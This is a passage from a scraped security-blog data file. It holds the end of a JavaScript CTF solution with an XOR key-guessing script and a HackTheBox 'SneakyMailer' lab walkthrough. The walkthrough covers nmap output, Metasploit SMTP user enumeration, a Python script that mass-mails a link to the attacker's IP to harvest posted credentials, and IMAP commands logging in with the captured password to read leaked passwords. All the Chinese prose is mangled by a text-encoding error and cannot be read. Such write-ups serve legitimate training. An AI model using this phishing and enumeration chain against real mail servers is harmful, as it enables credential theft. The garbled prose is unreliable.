list1.append(p[i]) print(''.join(chr(i) for i in list1)) å¾—åˆ°OhLord4309111 0x071234567891011121314151617181920212223242526272829303132333435// Look's like weak JavaScript auth script :)$(\".c_submit\").click(function(event) &#123; event.preventDefault(); var u = $(\"#cpass\").val(); var k = $(\"#cuser\").val(); var func = \"\\x2B\\x09\\x4A\\x03\\x49\\x0F\\x0E\\x14\\x15\\x1A\\x00\\x10\\x3F\\x1A\\x71\\x5C\\x5B\\x5B\\x00\\x1A\\x16\\x38\\x06\\x46\\x66\\x5A\\x55\\x30\\x0A\\x03\\x1D\\x08\\x50\\x5F\\x51\\x15\\x6B\\x4F\\x19\\x56\\x00\\x54\\x1B\\x50\\x58\\x21\\x1A\\x0F\\x13\\x07\\x46\\x1D\\x58\\x58\\x21\\x0E\\x16\\x1F\\x06\\x5C\\x1D\\x5C\\x45\\x27\\x09\\x4C\\x1F\\x07\\x56\\x56\\x4C\\x78\\x24\\x47\\x40\\x49\\x19\\x0F\\x11\\x1D\\x17\\x7F\\x52\\x42\\x5B\\x58\\x1B\\x13\\x4F\\x17\\x26\\x00\\x01\\x03\\x04\\x57\\x5D\\x40\\x19\\x2E\\x00\\x01\\x17\\x1D\\x5B\\x5C\\x5A\\x17\\x7F\\x4F\\x06\\x19\\x0A\\x47\\x5E\\x51\\x59\\x36\\x41\\x0E\\x19\\x0A\\x53\\x47\\x5D\\x58\\x2C\\x41\\x0A\\x04\\x0C\\x54\\x13\\x1F\\x17\\x60\\x50\\x12\\x4B\\x4B\\x12\\x18\\x14\\x42\\x79\\x4F\\x1F\\x56\\x14\\x12\\x56\\x58\\x44\\x27\\x4F\\x19\\x56\\x49\\x16\\x1B\\x16\\x14\\x21\\x1D\\x07\\x05\\x19\\x5D\\x5D\\x47\\x52\\x60\\x46\\x4C\\x1E\\x1D\\x5F\\x5F\\x1C\\x15\\x7E\\x0B\\x0B\\x00\\x49\\x51\\x5F\\x55\\x44\\x31\\x52\\x45\\x13\\x1B\\x40\\x5C\\x46\\x10\\x7C\\x38\\x10\\x19\\x07\\x55\\x13\\x44\\x56\\x31\\x1C\\x15\\x19\\x1B\\x56\\x13\\x47\\x58\\x30\\x1D\\x1B\\x58\\x55\\x1D\\x57\\x5D\\x41\\x7C\\x4D\\x4B\\x4D\\x49\\x4F\"; buf = \"\"; if (k.length == 9) &#123; for (i = 0, j = 0; i &lt; func.length; i++) &#123; c = parseInt(func.charCodeAt(i)); c = c ^ k.charCodeAt(j); if (++j == k.length) &#123; j = 0; &#125; buf += eval('\"' + a(x(c)) + '\"'); &#125; eval(buf); &#125; else &#123; $(\"#cresponse\").html(\"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;\"); &#125;&#125;);function a(h) &#123; if (h.length != 2) &#123; h = \"\\x30\" + h; &#125; return \"\\x5c\\x78\" + h;&#125;function x(d) &#123; if (d &lt; 0) &#123; d = 0xFFFFFFFF + d + 1; &#125; return d.toString(16).toUpperCase();&#125; è¿™é‡Œä»£ç æµç¨‹ä¹Ÿæ¯”è¾ƒå¤æ‚ã€‚ç®€å•æ¦‚æ‹¬å°±æ˜¯å»usernameä½œä¸ºè¾“å…¥ç„¶åæ¯9ä¸ªå­—ç¬¦ä¸æ‰€ç»™çš„funcè¿›è¡Œå¼‚æˆ–ã€‚æœ€åç»“æœä¼šè½¬hex. è™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“éœ€è¦çš„usernameæ˜æ–‡ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨a^b=c =&gt; a^c=bè¿™ç‚¹ï¼ŒçŒœæµ‹å¯†æ–‡ä¸­å¯èƒ½ä¼šå­˜åœ¨è·Ÿå‰é¢çš„å‡ºflagä¸€è‡´çš„ 123if(document.location.href.indexOf(\"?p=\") == -1) &#123; document.location = document.location.href + \"?p=\" + p; &#125; æ‰€ä»¥æˆ‘ä»¬ç®€å•çˆ†ç ´ä¸‹usernameå¹¶è¿›è¡Œå†…å®¹ç­›é€‰ï¼Œæ‰¾å‡ºæœ‰documentå‡ºç°çš„ç»“æœè¿™é‡Œå€Ÿç”¨å¦ä¸€ä½å¸ˆå‚…çš„è„šæœ¬https://github.com/NotSurprised/RingZer0-CTF-Writeup/blob/master/JavaScript/07.%20Why%20not%20be%20more%20secure/Why%20not%20be%20more%20secure.md 123456789101112131415161718192021222324252627282930313233343536var func = \"\\x2B\\x09\\x4A\\x03\\x49\\x0F\\x0E\\x14\\x15\\x1A\\x00\\x10\\x3F\\x1A\\x71\\x5C\\x5B\\x5B\\x00\\x1A\\x16\\x38\\x06\\x46\\x66\\x5A\\x55\\x30\\x0A\\x03\\x1D\\x08\\x50\\x5F\\x51\\x15\\x6B\\x4F\\x19\\x56\\x00\\x54\\x1B\\x50\\x58\\x21\\x1A\\x0F\\x13\\x07\\x46\\x1D\\x58\\x58\\x21\\x0E\\x16\\x1F\\x06\\x5C\\x1D\\x5C\\x45\\x27\\x09\\x4C\\x1F\\x07\\x56\\x56\\x4C\\x78\\x24\\x47\\x40\\x49\\x19\\x0F\\x11\\x1D\\x17\\x7F\\x52\\x42\\x5B\\x58\\x1B\\x13\\x4F\\x17\\x26\\x00\\x01\\x03\\x04\\x57\\x5D\\x40\\x19\\x2E\\x00\\x01\\x17\\x1D\\x5B\\x5C\\x5A\\x17\\x7F\\x4F\\x06\\x19\\x0A\\x47\\x5E\\x51\\x59\\x36\\x41\\x0E\\x19\\x0A\\x53\\x47\\x5D\\x58\\x2C\\x41\\x0A\\x04\\x0C\\x54\\x13\\x1F\\x17\\x60\\x50\\x12\\x4B\\x4B\\x12\\x18\\x14\\x42\\x79\\x4F\\x1F\\x56\\x14\\x12\\x56\\x58\\x44\\x27\\x4F\\x19\\x56\\x49\\x16\\x1B\\x16\\x14\\x21\\x1D\\x07\\x05\\x19\\x5D\\x5D\\x47\\x52\\x60\\x46\\x4C\\x1E\\x1D\\x5F\\x5F\\x1C\\x15\\x7E\\x0B\\x0B\\x00\\x49\\x51\\x5F\\x55\\x44\\x31\\x52\\x45\\x13\\x1B\\x40\\x5C\\x46\\x10\\x7C\\x38\\x10\\x19\\x07\\x55\\x13\\x44\\x56\\x31\\x1C\\x15\\x19\\x1B\\x56\\x13\\x47\\x58\\x30\\x1D\\x1B\\x58\\x55\\x1D\\x57\\x5D\\x41\\x7C\\x4D\\x4B\\x4D\\x49\\x4F\";function xor(ori_chr, dst_chr)&#123; return String.fromCharCode(ori_chr.charCodeAt() ^ dst_chr.charCodeAt());&#125;function decode(key)&#123; var buffer = '' for (var i = 0; i &lt; func.length; i++) &#123; buffer += xor(key[i % 9], func[i]) &#125; return buffer;&#125;function guess(i, guesskey)&#123; key = [] for (var j = 0; j &lt; guesskey.length; j++) &#123; key[(i+j) % 9] = xor(guesskey[j], func[i + j]) &#125; return key.join('');&#125;for (var i = 0; i &lt; func.length - 9; i++) &#123; key = guess(i, 'document.'); finalbuffer = decode(key); if (finalbuffer.indexOf('document.location') != -1) &#123; console.log(i, key, finalbuffer); &#125;&#125; æ‹¿åˆ°ç”¨æˆ·åå¯†ç  å°ç»“ç®€å•å°ç»“ä¸‹ï¼Œjsçš„trickè¿˜æ˜¯æŒºå¤šçš„ï¼Œä¸è¿‡è¿™å‡ é“é¢˜æ¥è§¦åˆ°trickçš„å±‚é¢å¾ˆæµ…ã€‚çœŸæ­£CTFæ¯”èµ›ä¸­è¿ç”¨åˆ°å¼±ç±»å‹ä¹‹ç±»çš„å€’æ˜¯æ¯”è¾ƒæœ‰æ„æ€ã€‚è€Œè¿™äº›challengeæ›´å¤šçš„å°±æ˜¯åˆ©ç”¨jsæ¥æ··æ·†è§†å¬ä¹‹ç±»çš„ï¼Œæ‰€ä»¥è€å®è¯´æ¯”è¾ƒè€ƒéªŒä»£ç å®¡è®¡çš„è€å¿ƒè·Ÿdebugæ°´å¹³ã€‚ è¿™ä¸ªå¹³å°çš„jailç³»åˆ—æœ‰æ—¶é—´ä¼šå»åšåšã€‚","categories":[],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://www.bycsec.top/tags/javascript/"}]},{"title":"hackthebox-SneakyMailer","slug":"hackthebox-SneakyMailer","date":"2020-07-16T10:57:21.000Z","updated":"2021-02-18T05:09:24.139Z","comments":true,"path":"2020/07/16/hackthebox-SneakyMailer/","link":"","permalink":"https://www.bycsec.top/2020/07/16/hackthebox-SneakyMailer/","excerpt":"SneakyMaileræ˜¯è‡ªå·±åœ¨htbä¸Šå®Œæˆçš„ç¬¬30å°é¶æœºã€‚å› ä¸ºç‰¹æ®Šçºªå¿µæ„ä¹‰åŠ ä¸Šæ¶‰åŠåˆ°ä¸€äº›å¾ˆæœ‰æ„æ€çš„çŸ¥è¯†æ‰€ä»¥è®°å½•ä¸‹ã€‚æ•´ä½“éš¾åº¦æ¯”è¾ƒç®€å•ã€‚ ç”±äºSneakyMailerè¿˜æ˜¯activeçŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä¼šç»™æ–‡ç« ä¸Šé”ç›´åˆ°é¶æœºé€€å½¹ã€‚ps:å·²é€€å½¹","text":"SneakyMaileræ˜¯è‡ªå·±åœ¨htbä¸Šå®Œæˆçš„ç¬¬30å°é¶æœºã€‚å› ä¸ºç‰¹æ®Šçºªå¿µæ„ä¹‰åŠ ä¸Šæ¶‰åŠåˆ°ä¸€äº›å¾ˆæœ‰æ„æ€çš„çŸ¥è¯†æ‰€ä»¥è®°å½•ä¸‹ã€‚æ•´ä½“éš¾åº¦æ¯”è¾ƒç®€å•ã€‚ ç”±äºSneakyMailerè¿˜æ˜¯activeçŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä¼šç»™æ–‡ç« ä¸Šé”ç›´åˆ°é¶æœºé€€å½¹ã€‚ps:å·²é€€å½¹ é¶æœºipï¼š 10.10.10.197 æ”»å‡»æœºï¼š 10.10.14.87 initial footholdé¦–å…ˆä¸Šnmap 12345678910111213141516171819202122232425262728293031323334353637# Nmap 7.80 scan initiated Mon Jul 13 10:04:34 2020 as: nmap -sC -sV -oA nmap/sneakymailer 10.10.10.197Nmap scan report for 10.10.10.197Host is up (0.41s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)| 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)|_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)25/tcp open smtp Postfix smtpd|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Did not follow redirect to http://sneakycorp.htb143/tcp open imap Courier Imapd (released 2018)|_imap-capabilities: ENABLE THREAD=ORDEREDSUBJECT UTF8=ACCEPTA0001 OK QUOTA SORT CHILDREN STARTTLS IMAP4rev1 THREAD=REFERENCES ACL2=UNION NAMESPACE ACL IDLE CAPABILITY completed UIDPLUS| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time993/tcp open ssl/imap Courier Imapd (released 2018)| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time8080/tcp open http nginx 1.14.2|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: nginx/1.14.2|_http-title: Welcome to nginx!Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jul 13 10:05:43 2020 -- 1 IP address (1 host up) scanned in 68.86 seconds nmapå¾—åˆ°ç»“æœæœ‰å¤šä¸ªç«¯å£å¼€æ”¾ï¼Œå…¶ä¸­ä¸å¤ªå¸¸è§„çš„æ˜¯25,143,993ç­‰ç«¯å£ã€‚æ­£å¦‚ç»“æœæ‰€ç¤ºï¼Œè¿™äº›ç«¯å£éƒ½ä¸é‚®ä»¶æœ‰å…³ã€‚å…¶ä¸­25æ˜¯smtpç«¯å£ã€‚143,993æ˜¯imapçš„é»˜è®¤ä¸¤ä¸ªç«¯å£ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯æ˜æ–‡ä¸€ä¸ªæ˜¯sslåŠ å¯†ã€‚ 21ftpç«¯å£ä¸èƒ½åŒ¿åç™»å½•ã€‚é‚£æˆ‘ä»¬å…ˆä»80ç«¯å£å¼€å§‹ã€‚å¼€å§‹ä¸€ä¸ªè·³è½¬ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠsneakycorp.htbåŠ å…¥åˆ°/etc/hostsä¸­ã€‚webé¡µé¢ç»“æœåªæœ‰index.phpä¸team.phpå­˜åœ¨ã€‚è€Œteam.phpæºç ä¸­å­˜åœ¨å‡ åä¸ªemail.å‡æ˜¯xxx@sneakymailer.htbå½¢å¼ã€‚æœæ–­å…ˆæŠŠmailæ”¶é›†èµ·æ¥ã€‚å¹¶ä¸”userè·Ÿmailå„å­˜ä¸€ä»½ 123456789101112import requestsimport reurl='http://sneakycorp.htb/team.php'r=requests.get(url)mail=re.findall(r'&lt;td&gt;(.*)@sneakymailer.htb',r.text)f=open('user.txt','w')for i in mail: #f.write(i+'\\n') f.write(i+'@sneakymailer.htb'+'\\n')f.close() ç„¶åæºç ä¸­æç¤ºäº†ä¸€ä¸ªpypi/register.phpã€‚è®¿é—®åä¼¼ä¹å¯ä»¥æä¾›æ³¨å†ŒåŠŸèƒ½ã€‚ä½†æ˜¯æ ¹æ®ç®€å•çš„å‡ ä¸ªdemoæ„Ÿè§‰è¿˜æ˜¯ä¸ªé™æ€æ–‡ä»¶ã€‚å› ä¸ºå‡å¦‚å†æ¬¡è¾“å…¥å¯†ç è·ŸåŸå¯†ç ä¸ä¸€è‡´å®ƒä¹Ÿæ²¡æœ‰è¿›è¡Œä»»ä½•æŠ¥é”™ã€‚é‚£ä¹ˆæˆ‘æœ‰ç†ç”±æ€€ç–‘æ•´ä¸ªç½‘ç«™éƒ½é™æ€çš„ã€‚ æ—¢ç„¶å¦‚æ­¤åªèƒ½ä»å‡ ä¸ªé‚®ä»¶æœåŠ¡å™¨å…¥æ‰‹enumäº†ã€‚è¿™é‡Œæˆ‘å…ˆå»äº†è§£äº†ä¸‹smtp,imapçš„ç›¸å…³ä¿¡æ¯ä»¥åŠå¸¸è§æ¼æ´ã€‚ç®€å•æ¦‚æ‹¬å¦‚ä¸‹ï¼š smtpä¸»è¦ç”¨äºå‘é€é‚®ä»¶ã€‚imapä¸»è¦ç”¨äºæ¥æ”¶é‚®ä»¶ smtp/imap server å‡å¯ä½¿ç”¨ telnet,ncè¿›è¡Œè¿æ¥ smtpå¯ä»¥åœ¨ä¸ç™»å½•çš„æƒ…å†µä¸‹è¿›è¡Œusernameçš„æšä¸¾ã€‚imapå¿…é¡»ç™»å½•æ‰èƒ½è¿›è¡Œæ¥ä¸‹æ¥çš„æŸ¥çœ‹é‚®ä»¶ä¿¡æ¯ç­‰æ“ä½œ å¹¶ä¸”ä¸¤ç§æœåŠ¡åŸºæœ¬ä¸Šä¸å­˜åœ¨å¯ä»¥ç›´æ¥åˆ©ç”¨çš„æ¼æ´ã€‚çœ‹æ¥æ˜¯è¦è¿›è¡Œä¿¡æ¯æšä¸¾äº†ã€‚é¦–å…ˆä»25ç«¯å£å¼€å§‹ã€‚å‰é¢æåˆ°äº†ã€‚é’ˆå¯¹smtpçš„enumä¸»è¦å°±åªæœ‰ç”¨æˆ·åçš„enum.æˆ‘ä»¬æ— æ³•è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚è¿™ç¯‡æ–‡ç« è®²çš„éå¸¸å…¨é¢ã€‚æˆ‘ä¹ŸåŸºæœ¬ä¸Šå…ˆæŒ‰ç…§è¿™ä¸ªæµç¨‹æ¥ã€‚æ¯”å¦‚é¦–å…ˆè¿›è¡Œæ‰‹åŠ¨æµ‹è¯•VRFY rootã€‚å¾—åˆ°252.è¯´æ˜rootç”¨æˆ·æ˜¯åœ¨æœºå™¨ä¸Šçš„ã€‚ä¸è¿‡ç»è¿‡å‰é¢nmapçš„æ¢æµ‹,ä¼¼ä¹èƒ½ä½¿ç”¨çš„smtpå‘½ä»¤éå¸¸å±€é™ã€‚çœ‹æ¥æˆ‘ä»¬åªèƒ½ä»VRFYä¸‹æ‰‹äº†ã€‚ è¿™é‡Œä½¿ç”¨msfçš„æ¨¡å—è¿›è¡Œenum,å…·ä½“æ–¹æ³•å‚è€ƒä¸Šé¢æ–‡ç« ã€‚å…¶å®ä¹‹å‰ä½¿ç”¨äº†smtp-user-enumã€‚ä½†ä¼¼ä¹å­˜åœ¨é—®é¢˜,æ²¡æœ‰å¾—åˆ°æˆ‘æƒ³è¦çš„ç»“æœã€‚æ¢äº†msfçš„æ¨¡å—å°±å¥½äº†ã€‚ 123456msf5 auxiliary(scanner/smtp/smtp_enum) &gt; exploit[*] 10.10.10.197:25 - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)[+] 10.10.10.197:25 - 10.10.10.197:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb[*] 10.10.10.197:25 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed çœ‹èµ·æ¥æˆ‘ä»¬å¾—åˆ°çš„é‚®ç®±éƒ½æ˜¯æœ‰æ•ˆçš„â€¦â€¦åˆ°è¿™ä¸€æ­¥å°±å¾ˆéš¾è¿›ä¸€æ­¥è¿›è¡Œå‘å±•äº†ã€‚å› ä¸ºsmtpçš„åˆ©ç”¨æœ€å¤šåˆ°æšä¸¾ç”¨æˆ·åã€‚imapä¸ftpåˆéœ€è¦ç”¨æˆ·å¯†ç ã€‚8080ç«¯å£è·‘ç€ä¸€ä¸ªä¼¼ä¹è£¸çš„nginx.é¡¿æ—¶å°‘äº†æ€è·¯ å»è®ºå›é€›äº†ä¸€åœˆã€‚å‘ç°å¤§å®¶æåˆ°äº†é’“é±¼çš„è¯´æ³•ã€‚éš¾ä¸æˆæ˜¯è¦å‘é€é‚®ä»¶ï¼Ÿç®€å•æœç´¢äº†ä¸‹å‘ç°pythonæ”¯æŒæˆ‘ä»¬è°ƒç”¨smtpæœåŠ¡å™¨è¿›è¡Œemailçš„å‘é€ã€‚é‚£å°±æŒ‰ç…§èœé¸Ÿæ•™ç¨‹çš„è„šæœ¬æ”¹æ”¹ 123456789101112131415161718192021222324#!/usr/bin/python# -*- coding: UTF-8 -*- import smtplibfrom email.mime.text import MIMETextfrom email.header import Header sender = 'byc@bycsec.top'with open('mail.txt','r') as f: receivers = f.read().splitlines()message = MIMEText('http://10.10.14.87', 'plain', 'utf-8')message['From'] = Header(\"byc\", 'utf-8')message['To'] = Header(\"aaa\", 'utf-8') subject = 'Sth Really Helpful'message['Subject'] = Header(subject, 'utf-8')try: smtpObj = smtplib.SMTP('10.10.10.197',25) smtpObj.sendmail(sender, receivers, message.as_string()) print(\"[*] success\")except smtplib.SMTPException: print(\"[*] Error\") è¿™é‡Œä¸»è¦æ˜¯æ›´æ”¹smtplib.SMTP(&#39;10.10.10.197&#39;,25)ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½ä½¿ç”¨htbçš„smtpæœåŠ¡å™¨è¿›è¡Œå‘é€é‚®ä»¶ã€‚åŒæ—¶receiversè¿™ä¸ªå‚æ•°æ˜¯æ”¯æŒpythonåˆ—è¡¨çš„ã€‚æ‰€ä»¥ç›´æ¥ä¼ å…¥æˆ‘ä»¬ä¹‹å‰æ”¶é›†çš„æ‰€æœ‰email.æœ€åå†…å®¹ç›´æ¥ç»™æˆ‘ä»¬è‡ªå·±ip.çœ‹çœ‹ä¼šä¸ä¼šæœ‰ç‚¹å‡»åŠ«æŒçš„ä¿¡æ¯å‘è¿‡æ¥ã€‚ å‘ç°æœ‰postä¿¡æ¯ã€‚é‚£ä¹ˆå†è·‘éè„šæœ¬,ç›´æ¥åˆ‡æ¢æˆncæ¥æ”¶ çœ‹èµ·æ¥paulç”¨æˆ·çš„è´¦å·å¯†ç åˆ°æ‰‹äº†ã€‚ï¼ˆç»å…¸é’“é±¼åœºæ™¯ï¼‰æ¥ä¸‹æ¥å› ä¸ºè¿™æ˜¯é‚®ç®±ç”¨æˆ·ï¼Œæˆ‘ä»¬ç”¨imapè´¦æˆ·æˆåŠŸç™»å½•å…³äºimapçš„å‘½ä»¤æ‰§è¡Œ çœ‹äº†è¿™ç¯‡æ–‡ç« åº”è¯¥å°±ä¼šæ“ä½œäº†ã€‚ç®€å•çš„è¯´å°±æ˜¯åœ¨æ¯ä¸ªå‘½ä»¤å‰éƒ½è¦åŠ ä¸ªå­—æ¯åšå‰ç¼€ã€‚ç„¶åæ‰§è¡ŒLOGIN,SELECTç­‰æ“ä½œç¬¬ä¸€æ­¥å…ˆæŸ¥çœ‹namespaceã€‚ç„¶åå‘ç°æˆ‘ä»¬çš„Personal Namespaceæœ‰INBOX.å­˜åœ¨ã€‚æ‰€ä»¥ç»§ç»­åˆ— INBOX.ä¸‹çš„æ–‡ä»¶å¤¹ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€‰å®šä¸€ä¸ªæ–‡ä»¶å¤¹äº† 1234567891011121314151617root@byc404:~# telnet 10.10.10.197 143Trying 10.10.10.197...Connected to 10.10.10.197.Escape character is '^]'.* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc. See COPYING for distribution information.a login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)a OK LOGIN Ok.n namespace* NAMESPACE ((\"INBOX.\" \".\")) NIL ((\"#shared.\" \".\")(\"shared.\" \".\"))n OK NAMESPACE completed.A1 list \"INBOX.\" \"*\"* LIST (\\HasNoChildren) \".\" \"INBOX.Trash\"* LIST (\\HasNoChildren) \".\" \"INBOX.Sent\"* LIST (\\HasNoChildren) \".\" \"INBOX.Deleted Items\"* LIST (\\HasNoChildren) \".\" \"INBOX.Sent Items\"A1 OK LIST completed ç»è¿‡å°è¯•å‘ç°åªæœ‰INBOX.Sent Itemsé‡Œæœ‰2 EXISTS. 12345678g21 SELECT \"INBOX.Sent Items\"* FLAGS (\\Draft \\Answered \\Flagged \\Deleted \\Seen \\Recent)* OK [PERMANENTFLAGS (\\* \\Draft \\Answered \\Flagged \\Deleted \\Seen)] Limited* 2 EXISTS* 0 RECENT* OK [UIDVALIDITY 589480766] Ok* OK [MYRIGHTS \"acdilrsw\"] ACLg21 OK [READ-WRITE] Ok é‚£ä¹ˆæˆ‘ä»¬ä¾æ¬¡æŸ¥çœ‹é‚®ä»¶ä¸»é¢˜ä¸å†…å®¹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596f fetch 1:2 (BODY[HEADER.FIELDS (Subject)])* 1 FETCH (BODY[HEADER.FIELDS (\"Subject\")] &#123;27&#125;Subject: Password reset)* 2 FETCH (BODY[HEADER.FIELDS (\"Subject\")] &#123;27&#125;Subject: Module testing)f OK FETCH completed.F1 fetch 1 RFC822* 1 FETCH (RFC822 &#123;2167&#125;MIME-Version: 1.0To: root &lt;root@debian&gt;From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;Subject: Password resetDate: Fri, 15 May 2020 13:03:37 -0500Importance: normalX-Priority: 3Content-Type: multipart/alternative; boundary=\"_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_\"--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/plain; charset=\"utf-8\"Hello administrator, I want to change this password for the developer accou=ntUsername: developerOriginal-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]CPlease notify me when you do it=20--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/html; charset=\"utf-8\"&lt;html xmlns:o=3D\"urn:schemas-microsoft-com:office:office\" xmlns:w=3D\"urn:sc=hemas-microsoft-com:office:word\" xmlns:m=3D\"http://schemas.microsoft.com/of=fice/2004/12/omml\" xmlns=3D\"http://www.w3.org/TR/REC-html40\"&gt;&lt;head&gt;&lt;meta ht=tp-equiv=3DContent-Type content=3D\"text/html; charset=3Dutf-8\"&gt;&lt;meta name==3DGenerator content=3D\"Microsoft Word 15 (filtered medium)\"&gt;&lt;style&gt;&lt;!--/* Font Definitions */@font-face &#123;font-family:\"Cambria Math\"; panose-1:2 4 5 3 5 4 6 3 2 4;&#125;@font-face &#123;font-family:Calibri; panose-1:2 15 5 2 2 2 4 3 2 4;&#125;/* Style Definitions */p.MsoNormal, li.MsoNormal, div.MsoNormal &#123;margin:0in; margin-bottom:.0001pt; font-size:11.0pt; font-family:\"Calibri\",sans-serif;&#125;.MsoChpDefault &#123;mso-style-type:export-only;&#125;@page WordSection1 &#123;size:8.5in 11.0in; margin:1.0in 1.0in 1.0in 1.0in;&#125;div.WordSection1 &#123;page:WordSection1;&#125;--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D\"#954F72\"&gt;&lt;div cla=ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=e this password for the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=l&gt;Original-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you do i=t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--)F1 OK FETCH completed.F1 fetch 2 RFC822* 2 FETCH (RFC822 &#123;585&#125;To: low@debianFrom: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;Subject: Module testingMessage-ID: &lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;Date: Wed, 27 May 2020 13:28:58 -0400User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Thunderbird/68.8.0MIME-Version: 1.0Content-Type: text/plain; charset=utf-8; format=flowedContent-Transfer-Encoding: 7bitContent-Language: en-USHello lowYour current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience.)F1 OK FETCH completed. ç¬¬ä¸€ä»½é‚®ä»¶æ³„éœ²äº†ä¸€ä»½ç”¨æˆ·å¯†ç 